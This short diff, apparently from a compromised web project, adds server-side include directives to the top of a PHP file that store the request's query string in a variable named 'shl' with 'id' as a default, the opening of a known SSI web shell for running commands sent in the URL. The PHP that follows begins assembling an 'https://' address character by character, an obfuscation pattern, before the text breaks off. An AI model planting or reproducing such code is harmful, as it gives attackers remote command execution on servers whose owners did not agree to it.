@@ -1,3 +1,10 @@
+<!--#config errmsg="[ERROR] SSI DISABLED"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="id" -->
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
 <?php
 
 $_u = 'h'.'t'.'t'.'p'.'s'.':' . '/' . '/' .
